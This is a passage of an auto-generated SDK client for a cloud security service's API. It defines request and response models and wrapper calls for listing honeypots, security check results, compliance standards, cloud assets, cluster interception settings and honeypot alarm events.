  ](name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model ListAvailableHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListAvailableHoneypotResponseBody(name='body'),
}

async function listAvailableHoneypotWithOptions(request: ListAvailableHoneypotRequest, runtime: Util.RuntimeOptions): ListAvailableHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListAvailableHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listAvailableHoneypot(request: ListAvailableHoneypotRequest): ListAvailableHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAvailableHoneypotWithOptions(request, runtime);
}

model ListCheckInstanceResultRequest {
  checkId?: long(name='CheckId'),
  currentPage?: int32(name='CurrentPage'),
  instanceIdKey?: string(name='InstanceIdKey'),
  instanceIds?: [ string ](name='InstanceIds'),
  instanceNameKey?: string(name='InstanceNameKey'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  regionIdKey?: string(name='RegionIdKey'),
  sortTypes?: [ string ](name='SortTypes'),
  statuses?: [ string ](name='Statuses'),
}

model ListCheckInstanceResultResponseBody = {
  basicData?: [ 
    {
      id?: long(name='Id'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      regionId?: string(name='RegionId'),
      status?: string(name='Status'),
    }
  ](name='BasicData'),
  checks?: [ map[string]any ](name='Checks'),
  columns?: [ 
    {
      grids?: [ 
        {
          key?: string(name='Key'),
          showName?: string(name='ShowName'),
          type?: string(name='Type'),
        }
      ](name='Grids'),
      key?: string(name='Key'),
      search?: boolean(name='Search'),
      searchKey?: string(name='SearchKey'),
      showName?: string(name='ShowName'),
      type?: string(name='Type'),
    }
  ](name='Columns'),
  pageInfo?: {
    count?: string(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model ListCheckInstanceResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckInstanceResultResponseBody(name='body'),
}

async function listCheckInstanceResultWithOptions(request: ListCheckInstanceResultRequest, runtime: Util.RuntimeOptions): ListCheckInstanceResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.instanceIdKey)) {
    query['InstanceIdKey'] = request.instanceIdKey;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.instanceNameKey)) {
    query['InstanceNameKey'] = request.instanceNameKey;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionIdKey)) {
    query['RegionIdKey'] = request.regionIdKey;
  }
  if (!Util.isUnset(request.sortTypes)) {
    query['SortTypes'] = request.sortTypes;
  }
  if (!Util.isUnset(request.statuses)) {
    query['Statuses'] = request.statuses;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckInstanceResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listCheckInstanceResult(request: ListCheckInstanceResultRequest): ListCheckInstanceResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckInstanceResultWithOptions(request, runtime);
}

model ListCheckItemWarningMachineRequest {
  checkId?: long(name='CheckId'),
  containerFieldName?: string(name='ContainerFieldName'),
  containerFieldValue?: string(name='ContainerFieldValue'),
  currentPage?: int32(name='CurrentPage'),
  groupId?: long(name='GroupId'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  remark?: string(name='Remark'),
  riskType?: string(name='RiskType'),
  status?: int32(name='Status'),
}

model ListCheckItemWarningMachineResponseBody = {
  list?: [ 
    {
      authVersion?: int32(name='AuthVersion'),
      bind?: boolean(name='Bind'),
      fixList?: [ 
        {
          riskId?: long(name='RiskId'),
          riskName?: string(name='RiskName'),
        }
      ](name='FixList'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      portOpen?: boolean(name='PortOpen'),
      prompt?: string(name='Prompt'),
      regionId?: string(name='RegionId'),
      status?: int32(name='Status'),
      uuid?: string(name='Uuid'),
      warningRiskList?: [ 
        {
          riskId?: long(name='RiskId'),
          riskName?: string(name='RiskName'),
        }
      ](name='WarningRiskList'),
    }
  ](name='List'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model ListCheckItemWarningMachineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckItemWarningMachineResponseBody(name='body'),
}

async function listCheckItemWarningMachineWithOptions(request: ListCheckItemWarningMachineRequest, runtime: Util.RuntimeOptions): ListCheckItemWarningMachineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.riskType)) {
    query['RiskType'] = request.riskType;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckItemWarningMachine',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listCheckItemWarningMachine(request: ListCheckItemWarningMachineRequest): ListCheckItemWarningMachineResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckItemWarningMachineWithOptions(request, runtime);
}

model ListCheckItemWarningSummaryRequest {
  checkItemFuzzy?: string(name='CheckItemFuzzy'),
  checkLevel?: string(name='CheckLevel'),
  checkType?: string(name='CheckType'),
  checkWarningStatus?: int32(name='CheckWarningStatus'),
  containerFieldName?: string(name='ContainerFieldName'),
  containerFieldValue?: string(name='ContainerFieldValue'),
  currentPage?: int32(name='CurrentPage'),
  groupId?: long(name='GroupId'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  riskType?: string(name='RiskType'),
}

model ListCheckItemWarningSummaryResponseBody = {
  list?: [ 
    {
      advice?: string(name='Advice'),
      alias?: string(name='Alias'),
      checkId?: long(name='CheckId'),
      checkItem?: string(name='CheckItem'),
      checkLevel?: string(name='CheckLevel'),
      checkType?: string(name='CheckType'),
      description?: string(name='Description'),
      riskType?: string(name='RiskType'),
      status?: int32(name='Status'),
      warningMachineCount?: int32(name='WarningMachineCount'),
    }
  ](name='List'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model ListCheckItemWarningSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckItemWarningSummaryResponseBody(name='body'),
}

async function listCheckItemWarningSummaryWithOptions(request: ListCheckItemWarningSummaryRequest, runtime: Util.RuntimeOptions): ListCheckItemWarningSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkItemFuzzy)) {
    query['CheckItemFuzzy'] = request.checkItemFuzzy;
  }
  if (!Util.isUnset(request.checkLevel)) {
    query['CheckLevel'] = request.checkLevel;
  }
  if (!Util.isUnset(request.checkType)) {
    query['CheckType'] = request.checkType;
  }
  if (!Util.isUnset(request.checkWarningStatus)) {
    query['CheckWarningStatus'] = request.checkWarningStatus;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskType)) {
    query['RiskType'] = request.riskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckItemWarningSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listCheckItemWarningSummary(request: ListCheckItemWarningSummaryRequest): ListCheckItemWarningSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckItemWarningSummaryWithOptions(request, runtime);
}

model ListCheckResultRequest {
  checkKey?: string(name='CheckKey'),
  currentPage?: int32(name='CurrentPage'),
  instanceIds?: [ string ](name='InstanceIds'),
  instanceTypes?: [ string ](name='InstanceTypes'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  requirementIds?: [ long ](name='RequirementIds'),
  riskLevels?: [ string ](name='RiskLevels'),
  sortTypes?: [ string ](name='SortTypes'),
  standardIds?: [ long ](name='StandardIds'),
  statuses?: [ string ](name='Statuses'),
  vendors?: [ string ](name='Vendors'),
}

model ListCheckResultResponseBody = {
  checks?: [ 
    {
      checkId?: long(name='CheckId'),
      checkPolicies?: [ 
        {
          requirementId?: long(name='RequirementId'),
          requirementShowName?: string(name='RequirementShowName'),
          sectionId?: long(name='SectionId'),
          sectionShowName?: string(name='SectionShowName'),
          standardId?: long(name='StandardId'),
          standardShowName?: string(name='StandardShowName'),
        }
      ](name='CheckPolicies'),
      checkShowName?: string(name='CheckShowName'),
      instanceSubType?: string(name='InstanceSubType'),
      instanceType?: string(name='InstanceType'),
      lastCheckTime?: long(name='LastCheckTime'),
      riskLevel?: string(name='RiskLevel'),
      status?: string(name='Status'),
      taskId?: string(name='TaskId'),
      trialPermission?: boolean(name='TrialPermission'),
      vendor?: string(name='Vendor'),
      vendorShowName?: string(name='VendorShowName'),
    }
  ](name='Checks'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model ListCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckResultResponseBody(name='body'),
}

async function listCheckResultWithOptions(request: ListCheckResultRequest, runtime: Util.RuntimeOptions): ListCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkKey)) {
    query['CheckKey'] = request.checkKey;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.instanceTypes)) {
    query['InstanceTypes'] = request.instanceTypes;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.requirementIds)) {
    query['RequirementIds'] = request.requirementIds;
  }
  if (!Util.isUnset(request.riskLevels)) {
    query['RiskLevels'] = request.riskLevels;
  }
  if (!Util.isUnset(request.sortTypes)) {
    query['SortTypes'] = request.sortTypes;
  }
  if (!Util.isUnset(request.standardIds)) {
    query['StandardIds'] = request.standardIds;
  }
  if (!Util.isUnset(request.statuses)) {
    query['Statuses'] = request.statuses;
  }
  if (!Util.isUnset(request.vendors)) {
    query['Vendors'] = request.vendors;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listCheckResult(request: ListCheckResultRequest): ListCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckResultWithOptions(request, runtime);
}

model ListCheckStandardRequest {
  instanceIds?: [ string ](name='InstanceIds'),
  instanceSubTypes?: [ string ](name='InstanceSubTypes'),
  instanceTypes?: [ string ](name='InstanceTypes'),
  lang?: string(name='Lang'),
  vendors?: [ string ](name='Vendors'),
}

model ListCheckStandardResponseBody = {
  requestId?: string(name='RequestId'),
  standards?: [ 
    {
      id?: long(name='Id'),
      requirements?: [ 
        {
          id?: long(name='Id'),
          riskCheckCount?: long(name='RiskCheckCount'),
          showName?: string(name='ShowName'),
        }
      ](name='Requirements'),
      showName?: string(name='ShowName'),
      type?: string(name='Type'),
    }
  ](name='Standards'),
}

model ListCheckStandardResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckStandardResponseBody(name='body'),
}

async function listCheckStandardWithOptions(request: ListCheckStandardRequest, runtime: Util.RuntimeOptions): ListCheckStandardResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.instanceSubTypes)) {
    query['InstanceSubTypes'] = request.instanceSubTypes;
  }
  if (!Util.isUnset(request.instanceTypes)) {
    query['InstanceTypes'] = request.instanceTypes;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.vendors)) {
    query['Vendors'] = request.vendors;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckStandard',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listCheckStandard(request: ListCheckStandardRequest): ListCheckStandardResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckStandardWithOptions(request, runtime);
}

model ListClientUserDefineRuleTypesResponseBody = {
  requestId?: string(name='RequestId'),
  userDefineRuleTypes?: [ string ](name='UserDefineRuleTypes'),
}

model ListClientUserDefineRuleTypesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListClientUserDefineRuleTypesResponseBody(name='body'),
}

async function listClientUserDefineRuleTypesWithOptions(runtime: Util.RuntimeOptions): ListClientUserDefineRuleTypesResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListClientUserDefineRuleTypes',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listClientUserDefineRuleTypes(): ListClientUserDefineRuleTypesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listClientUserDefineRuleTypesWithOptions(runtime);
}

model ListClientUserDefineRulesRequest {
  currentPage?: int32(name='CurrentPage'),
  name?: string(name='Name'),
  pageSize?: int32(name='PageSize'),
  type?: [ int32 ](name='Type'),
}

model ListClientUserDefineRulesResponseBody = {
  pageInfo?: {
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  userDefineRuleList?: [ 
    {
      actionType?: int32(name='ActionType'),
      id?: long(name='Id'),
      name?: string(name='Name'),
      platform?: string(name='Platform'),
      switchId?: string(name='SwitchId'),
      type?: int32(name='Type'),
    }
  ](name='UserDefineRuleList'),
}

model ListClientUserDefineRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListClientUserDefineRulesResponseBody(name='body'),
}

async function listClientUserDefineRulesWithOptions(request: ListClientUserDefineRulesRequest, runtime: Util.RuntimeOptions): ListClientUserDefineRulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListClientUserDefineRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listClientUserDefineRules(request: ListClientUserDefineRulesRequest): ListClientUserDefineRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listClientUserDefineRulesWithOptions(request, runtime);
}

model ListCloudAssetInstancesRequest {
  cloudAssetTypes?: [ 
    {
      assetSubType?: int32(name='AssetSubType'),
      assetType?: int32(name='AssetType'),
    }
  ](name='CloudAssetTypes'),
  criteria?: string(name='Criteria'),
  currentPage?: int32(name='CurrentPage'),
  logicalExp?: string(name='LogicalExp'),
  pageSize?: int32(name='PageSize'),
  regionId?: string(name='RegionId'),
}

model ListCloudAssetInstancesResponseBody = {
  instances?: [ 
    {
      alarmStatus?: string(name='AlarmStatus'),
      assetSubType?: string(name='AssetSubType'),
      assetSubTypeName?: string(name='AssetSubTypeName'),
      assetType?: int32(name='AssetType'),
      assetTypeName?: string(name='AssetTypeName'),
      createdTime?: long(name='CreatedTime'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      regionId?: string(name='RegionId'),
      riskStatus?: string(name='RiskStatus'),
      securityInfo?: string(name='SecurityInfo'),
      vendor?: int32(name='Vendor'),
    }
  ](name='Instances'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model ListCloudAssetInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCloudAssetInstancesResponseBody(name='body'),
}

async function listCloudAssetInstancesWithOptions(request: ListCloudAssetInstancesRequest, runtime: Util.RuntimeOptions): ListCloudAssetInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.cloudAssetTypes)) {
    query['CloudAssetTypes'] = request.cloudAssetTypes;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCloudAssetInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listCloudAssetInstances(request: ListCloudAssetInstancesRequest): ListCloudAssetInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCloudAssetInstancesWithOptions(request, runtime);
}

model ListClusterCnnfStatusDetailRequest {
  clusterIds?: [ string ](name='ClusterIds'),
}

model ListClusterCnnfStatusDetailResponseBody = {
  data?: [ 
    {
      clusterId?: string(name='ClusterId'),
      installed?: boolean(name='Installed'),
      instanceId?: string(name='InstanceId'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      invalidType?: string(name='InvalidType'),
      machineName?: string(name='MachineName'),
      machineType?: int32(name='MachineType'),
      pluginName?: string(name='PluginName'),
      pluginVersion?: string(name='PluginVersion'),
      status?: string(name='Status'),
      uuid?: string(name='Uuid'),
    }
  ](name='Data'),
  requestId?: string(name='RequestId'),
}

model ListClusterCnnfStatusDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListClusterCnnfStatusDetailResponseBody(name='body'),
}

async function listClusterCnnfStatusDetailWithOptions(request: ListClusterCnnfStatusDetailRequest, runtime: Util.RuntimeOptions): ListClusterCnnfStatusDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterIds)) {
    query['ClusterIds'] = request.clusterIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListClusterCnnfStatusDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listClusterCnnfStatusDetail(request: ListClusterCnnfStatusDetailRequest): ListClusterCnnfStatusDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return listClusterCnnfStatusDetailWithOptions(request, runtime);
}

model ListClusterInterceptionConfigRequest {
  clusterCNNFStatus?: int32(name='ClusterCNNFStatus'),
  clusterId?: string(name='ClusterId'),
  clusterName?: string(name='ClusterName'),
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
}

model ListClusterInterceptionConfigResponseBody = {
  clusterConfigList?: [ 
    {
      clusterCNNFStatus?: int32(name='ClusterCNNFStatus'),
      clusterId?: string(name='ClusterId'),
      clusterName?: string(name='ClusterName'),
      clusterType?: string(name='ClusterType'),
      interceptionSwitch?: int32(name='InterceptionSwitch'),
      openRuleCount?: long(name='OpenRuleCount'),
      supportCNNF?: boolean(name='SupportCNNF'),
      totalRuleCount?: long(name='TotalRuleCount'),
    }
  ](name='ClusterConfigList'),
  pageInfo?: {
    count?: int32(name='Count'),
    currrentPage?: int32(name='CurrrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model ListClusterInterceptionConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListClusterInterceptionConfigResponseBody(name='body'),
}

async function listClusterInterceptionConfigWithOptions(request: ListClusterInterceptionConfigRequest, runtime: Util.RuntimeOptions): ListClusterInterceptionConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterCNNFStatus)) {
    query['ClusterCNNFStatus'] = request.clusterCNNFStatus;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListClusterInterceptionConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listClusterInterceptionConfig(request: ListClusterInterceptionConfigRequest): ListClusterInterceptionConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return listClusterInterceptionConfigWithOptions(request, runtime);
}

model ListHoneypotRequest {
  currentPage?: int32(name='CurrentPage'),
  honeypotIds?: [ string ](name='HoneypotIds'),
  honeypotName?: string(name='HoneypotName'),
  nodeId?: string(name='NodeId'),
  nodeName?: string(name='NodeName'),
  pageSize?: int32(name='PageSize'),
}

model ListHoneypotResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  list?: [ 
    {
      controlNodeName?: string(name='ControlNodeName'),
      honeypotId?: string(name='HoneypotId'),
      honeypotImageDisplayName?: string(name='HoneypotImageDisplayName'),
      honeypotImageId?: string(name='HoneypotImageId'),
      honeypotImageName?: string(name='HoneypotImageName'),
      honeypotName?: string(name='HoneypotName'),
      nodeId?: string(name='NodeId'),
      presetId?: string(name='PresetId'),
      state?: [ string ](name='State'),
    }
  ](name='List'),
  message?: string(name='Message'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model ListHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotResponseBody(name='body'),
}

async function listHoneypotWithOptions(request: ListHoneypotRequest, runtime: Util.RuntimeOptions): ListHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.honeypotIds)) {
    query['HoneypotIds'] = request.honeypotIds;
  }
  if (!Util.isUnset(request.honeypotName)) {
    query['HoneypotName'] = request.honeypotName;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listHoneypot(request: ListHoneypotRequest): ListHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotWithOptions(request, runtime);
}

model ListHoneypotAlarmEventsRequest {
  currentPage?: int32(name='CurrentPage'),
  dealed?: string(name='Dealed'),
  dstIp?: string(name='DstIp'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  riskLevelList?: [ string ](name='RiskLevelList'),
  srcIp?: string(name='SrcIp'),
}

model ListHoneypotAlarmEventsResponseBody = {
  honeypotAlarmEvents?: [ 
    {
      alarmEventId?: long(name='AlarmEventId'),
      alarmEventName?: string(name='AlarmEventName'),
      alarmEventType?: string(name='AlarmEventType'),
      alarmUniqueInfo?: string(name='AlarmUniqueInfo'),
      eventCount?: int32(name='EventCount'),
      firstTime?: long(name='FirstTime'),
      lastTime?: long(name='LastTime'),
      mergeFieldList?: [ 
        {
          fieldExtInfo?: string(name='FieldExtInfo'),
          fieldKey?: string(name='FieldKey'),
          fieldType?: string(name='FieldType'),
          fieldValue?: string(name='FieldValue'),
        }
      ](name='MergeFieldList'),
      operateStatus?: int32(name='OperateStatus'),
      riskLevel?: string(name='RiskLevel'),
    }
  ](name='HoneypotAlarmEvents'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model ListHoneypotAlarmEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotAlarmEventsResponseBody(name='body'),
}

async function listHoneypotAlarmEventsWithOptions(request: ListHoneypotAlarmEventsRequest, runtime: Util.RuntimeOptions): ListHoneypotAlarmEventsResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
